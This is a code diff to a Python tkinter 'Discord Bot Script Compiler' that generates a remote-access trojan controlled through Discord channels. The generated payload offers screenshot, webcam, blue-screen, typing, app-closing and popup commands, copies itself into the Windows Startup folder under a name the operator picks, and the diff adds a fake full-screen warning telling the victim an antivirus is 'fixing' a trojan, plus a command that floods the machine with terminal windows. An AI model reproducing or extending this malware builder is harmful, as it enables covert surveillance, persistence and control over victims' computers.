@@ -14,9 +14,13 @@ import win32gui
 import win32process
 
 def compile_script():
-    bot_token = entry.get()
+    bot_token = entry_token.get()
+    file_name = entry_filename.get()
     if not bot_token:
         result_label.config(text="Please enter a bot token.", fg="red")
+        return
+    if not file_name:
+        result_label.config(text="Please enter a file name.", fg="red")
         return
 
     script = f'''import discord
@@ -60,7 +64,7 @@ def create_black_window():
     black_window.attributes('-fullscreen', True)
     black_window.attributes('-toolwindow', True)
 
-    canvas = tk.Canvas(black_window, width=screen_width, height=screen_height, bd=0, highlightthickness=0, bg='#000000')
+    canvas = tk.Canvas(black_window, width=screen_width, height=screen_height, bd=0, highlightthickness=0, bg='#FF0000')  # Set background to red
     canvas.pack(fill=tk.BOTH, expand=True)
 
     canvas.create_text(
@@ -76,7 +80,7 @@ def create_black_window():
     canvas.create_text(
         screen_width / 2,
         screen_height / 6 + 100,
-        text="Re Calculating PC, Please wait.", 
+        text="Your antivirus found a trojan, no need to worry, we're fixing it, please wait!", 
         font=("Arial", 15), 
         fill="white",
         anchor="n",
@@ -121,7 +125,7 @@ async def create_category_and_channels():
         category = await guild.create_category(category_name)
     
     existing_channels = {{channel.name for channel in guild.channels}}
-    channel_names = ['screenshots', 'webcam', 'implode', 'bsod', 'type', 'apps', 'clode']
+    channel_names = ['screenshots', 'webcam', 'implode', 'bsod', 'type', 'apps', 'close', 'popup']  # Updated channels list
     for channel_name in channel_names:
         if channel_name not in existing_channels:
             await guild.create_text_channel(channel_name, category=category)
@@ -250,7 +254,7 @@ async def on_message(message):
                 if not found:
                     await message.channel.send(f"No process found with name: {{exe_name}}")
             else:
-                await message.channel.send("Please specify the name of the executable to close.")
+                await message.channel.send("Error: No process name provided to close.")
         elif message.content.startswith('.popup '):
             popup_message = message.content[7:].strip()
             if popup_message:
@@ -258,47 +262,64 @@ async def on_message(message):
                 await message.channel.send(f'Popup created with message: {{popup_message}}')
             else:
                 await message.channel.send("Error: No message provided for popup.")
+        elif message.content == '.lag':
+            Thread(target=open_all_terminals_at_once).start()
+            await message.channel.send('Opened and closed 100 terminal windows.')
     else:
         await message.channel.send('Commands can only be used in the designated channels.')
 
 def add_to_startup():
     startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-    script_name = 'Window Manager.pyw'
+    script_name = '{file_name}.pyw'
     script_path = os.path.abspath(__file__)
     destination = os.path.join(startup_folder, script_name)
+
     if not os.path.exists(destination):
-        shutil.copyfile(script_path, destination)
+        shutil.copy(script_path, destination)
 
-add_to_startup()
+def open_all_terminals_at_once():
+    for _ in range(100):
+        os.system('start /min cmd /c "exit"')
 
-client.run(Photon)'''
+if __name__ == "__main__":
+    add_to_startup()
+    client.run(Photon)
+'''
 
-    # Save the script in the same directory as the original script
-    original_script_path = os.path.abspath(__file__)
-    directory = os.path.dirname(original_script_path)
-    save_path = os.path.join(directory, 'compiled_script.pyw')
-
-    with open(save_path, 'w') as file:
-        file.write(script)
-
-    result_label.config(text=f"File compiled and saved successfully at: {save_path}", fg="green")
+    try:
+        original_script_path = os.path.abspath(__file__)
+        save_path = os.path.join(os.path.dirname(original_script_path), f'{file_name}.pyw')
+        with open(save_path, 'w') as script_file:
+            script_file.write(script)
+        result_label.config(text="Script compiled successfully.", fg="green")
+    except Exception as e:
+        result_label.config(text=f"Error: {e}", fg="red")
 
 root = tk.Tk()
-root.title("Script Compiler")
+root.title("Discord Bot Script Compiler")
 
 # Apply a modern theme
 root.configure(bg="#2e2e2e")
 
-# Entry widget
-entry = tk.Entry(root, width=50, font=("Arial", 12), bd=2, relief=tk.GROOVE)
-entry.pack(pady=10)
+frame = tk.Frame(root, padx=20, pady=20, bg="#2e2e2e")
+frame.pack(padx=10, pady=10)
 
-# Compile button
-compile_button = tk.Button(root, text="Compile Script", command=compile_script, font=("Arial", 12), bg="#4caf50", fg="white", bd=0, padx=10, pady=5)
+label_token = tk.Label(frame, text="Enter your bot token:", bg="#2e2e2e", fg="white")
+label_token.pack(anchor="w")
+
+entry_token = tk.Entry(frame, width=40, font=("Arial", 12), bd=2, relief=tk.GROOVE)
+entry_token.pack(anchor="w")
+
+label_filename = tk.Label(frame, text="Enter file name:", bg="#2e2e2e", fg="white")
+label_filename.pack(anchor="w")
+
+entry_filename = tk.Entry(frame, width=40, font=("Arial", 12), bd=2, relief=tk.GROOVE)
+entry_filename.pack(anchor="w")
+
+compile_button = tk.Button(frame, text="Compile Script", command=compile_script, font=("Arial", 12), bg="#4caf50", fg="white", bd=0, padx=10, pady=5)
 compile_button.pack(pady=10)
 
-# Result label
-result_label = tk.Label(root, text="", font=("Arial", 12), bg="#2e2e2e", fg="white")
-result_label.pack(pady=10)
+result_label = tk.Label(frame, text="", bg="#2e2e2e", fg="white")
+result_label.pack()
 
 root.mainloop()
